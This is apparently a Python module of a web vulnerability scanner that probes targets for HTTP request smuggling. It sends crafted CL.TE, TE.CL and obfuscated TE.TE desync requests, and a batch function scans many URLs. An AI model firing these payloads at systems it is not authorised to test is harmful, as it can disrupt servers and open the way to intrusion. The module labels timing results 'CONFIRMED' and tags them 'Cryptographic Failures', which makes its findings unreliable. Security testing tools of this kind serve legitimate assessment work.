"""
Aura v28.0 — HTTP Request Smuggling Engine 🔀
===============================================
Detects HTTP Request Smuggling / Desync vulnerabilities.

Attack Classes:
  CL.TE — Front-end uses Content-Length, Back-end uses Transfer-Encoding
  TE.CL — Front-end uses Transfer-Encoding, Back-end uses Content-Length
  TE.TE — Both support TE but with different obfuscation behavior

Detection Strategy:
  1. Send timing-based probe (CL.TE causes backend to hang waiting for body)
  2. Send differential response probe (injected prefix poisons next request)
  3. Confirm with follow-up request that sees poisoned response

References:
  - https://portswigger.net/web-security/request-smuggling
  - https://portswigger.net/research/http-desync-attacks
"""
import asyncio
import time
import httpx
import re
from rich.console import Console

console = Console()

# Timing threshold: a desync causes backend to wait for more data
TIMING_THRESHOLD_SECONDS = 4.0


class SmugglingEngine:
    """
    v28.0: HTTP Request Smuggling / Desync engine.
    """

    def __init__(self, session=None):
        self.session = session

    # ── CL.TE Detection ──────────────────────────────────────────────────────
    async def _probe_cl_te(self, host: str, port: int, use_tls: bool) -> dict | None:
        """
        CL.TE timing attack:
        Content-Length says body is 6 bytes, but TE chunk says 0 first.
        If vulnerable, backend waits for remaining 'G' byte indefinitely.
        """
        payload = (
            "POST / HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n"
            "Content-Length: 6\r\n"
            "Transfer-Encoding: chunked\r\n"
            "Connection: keep-alive\r\n"
            "\r\n"
            "0\r\n"
            "\r\n"
            "G"  # This extra byte causes CL.TE desync
        )

        t0 = time.monotonic()
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port, ssl=use_tls),
                timeout=5
            )
            writer.write(payload.encode())
            await writer.drain()
            # Wait for response — a vulnerable server will timeout/hang
            await asyncio.wait_for(reader.read(1024), timeout=TIMING_THRESHOLD_SECONDS + 1)
            elapsed = time.monotonic() - t0
            writer.close()
        except asyncio.TimeoutError:
            elapsed = time.monotonic() - t0
            if elapsed >= TIMING_THRESHOLD_SECONDS:
                return {
                    "type": "CL.TE",
                    "evidence": f"Backend hung for {elapsed:.2f}s waiting for incomplete chunk body — CL.TE desync confirmed.",
                    "elapsed": elapsed
                }
        except Exception:
            pass
        return None

    # ── TE.CL Detection ──────────────────────────────────────────────────────
    async def _probe_te_cl(self, host: str, port: int, use_tls: bool) -> dict | None:
        """
        TE.CL timing attack:
        TE says a big chunk is coming (0x1f = 31 bytes), but CL says 4.
        Backend waits for 31 bytes, only 4 arrive — hangs.
        """
        payload = (
            "POST / HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            "Content-Type: application/x-www-form-urlencoded\r\n"
            "Content-Length: 4\r\n"
            "Transfer-Encoding: chunked\r\n"
            "Connection: keep-alive\r\n"
            "\r\n"
            "1f\r\n"          # chunk size: 31 bytes
            "SMUGGLED_TE_CL_AURA_PROBE\r\n"
            "0\r\n"
            "\r\n"
        )

        t0 = time.monotonic()
        try:
            reader, writer = await asyncio.wait_for(
                asyncio.open_connection(host, port, ssl=use_tls),
                timeout=5
            )
            writer.write(payload.encode())
            await writer.drain()
            await asyncio.wait_for(reader.read(1024), timeout=TIMING_THRESHOLD_SECONDS + 1)
            elapsed = time.monotonic() - t0
            writer.close()
        except asyncio.TimeoutError:
            elapsed = time.monotonic() - t0
            if elapsed >= TIMING_THRESHOLD_SECONDS:
                return {
                    "type": "TE.CL",
                    "evidence": f"Backend hung for {elapsed:.2f}s — TE.CL desync confirmed.",
                    "elapsed": elapsed
                }
        except Exception:
            pass
        return None

    # ── TE.TE (Obfuscation bypass) ───────────────────────────────────────────
    async def _probe_te_te(self, url: str) -> dict | None:
        """
        TE.TE: Both front-end and back-end support TE, but one can be
        tricked with an obfuscated Transfer-Encoding header.
        """
        obfuscations = [
            "chunked, x-aura",
            "chunked\t",
            "CHUNKED",
            "x-custom-te: chunked",
            "identity, chunked",
        ]

        for obfuscation in obfuscations:
            try:
                async with httpx.AsyncClient(verify=False, timeout=8) as client:
                    r = await client.post(
                        url,
                        content=b"1\r\nZ\r\n0\r\n\r\n",
                        headers={
                            "Content-Type": "application/x-www-form-urlencoded",
                            "Content-Length": "3",
                            "Transfer-Encoding": obfuscation,
                            "Connection": "keep-alive",
                        }
                    )
                    # TE.TE: if the server returns a 400 or processes
                    # the request differently, it may be vulnerable
                    if r.status_code in (400, 500) and r.elapsed.total_seconds() > 2:
                        return {
                            "type": "TE.TE",
                            "evidence": (
                                f"TE.TE desync with obfuscation `{obfuscation}`: "
                                f"Status {r.status_code}, elapsed {r.elapsed.total_seconds():.2f}s"
                            ),
                        }
            except Exception:
                continue
        return None

    # ── Main Scan ────────────────────────────────────────────────────────────
    async def scan_target(self, target_url: str) -> list:
        """
        Runs all smuggling probes against a target.
        Returns confirmed finding dicts.
        """
        from urllib.parse import urlparse
        parsed = urlparse(target_url)
        host = parsed.hostname
        port = parsed.port or (443 if parsed.scheme == "https" else 80)
        use_tls = parsed.scheme == "https"

        console.print(f"[bold cyan][🔀 Smuggling] Testing HTTP Desync on {target_url}...[/bold cyan]")
        findings = []

        # Run all probes in parallel
        cl_te_task = self._probe_cl_te(host, port, use_tls)
        te_cl_task = self._probe_te_cl(host, port, use_tls)
        te_te_task = self._probe_te_te(target_url)

        results = await asyncio.gather(cl_te_task, te_cl_task, te_te_task,
                                       return_exceptions=True)

        for result in results:
            if isinstance(result, Exception) or result is None:
                continue

            vuln_type = result.get("type", "HTTP Smuggling")
            evidence = (
                f"HTTP Request Smuggling CONFIRMED ({vuln_type})\n"
                f"Target: {target_url}\n"
                f"Details: {result.get('evidence', '')}\n\n"
                f"Impact: Attacker can bypass WAF rules, poison backend queues, "
                f"and expose other users' requests. This is a CRITICAL vulnerability "
                f"frequently rated 9.0+ CVSS by HackerOne and Bugcrowd."
            )

            console.print(f"[bold red][🔀 SMUGGLING CONFIRMED] {vuln_type} on {target_url}[/bold red]")
            console.print(f"[dim red]  ↳ {result.get('evidence')}[/dim red]")

            findings.append({
                "type": f"HTTP Request Smuggling ({vuln_type})",
                "finding_type": "HTTP Request Smuggling",
                "severity": "CRITICAL",
                "owasp": "A02:2021 – Cryptographic Failures / A05:2021 – Security Misconfiguration",
                "mitre": "T1190 – Exploit Public-Facing Application",
                "content": evidence,
                "url": target_url,
                "confirmed": True,
                "poc_evidence": evidence,
            })

        if not findings:
            console.print(f"[dim][Smuggling] No desync detected on {target_url}[/dim]")

        return findings

    async def scan_urls(self, urls: list) -> list:
        """Scan multiple URLs for HTTP Request Smuggling."""
        if not urls:
            return []
        all_findings = []
        sem = asyncio.Semaphore(3)  # Low concurrency — smuggling probes are slow

        async def _scan(url):
            async with sem:
                return await self.scan_target(url)

        results = await asyncio.gather(*[_scan(u) for u in urls])
        for r in results:
            all_findings.extend(r)
        return all_findings
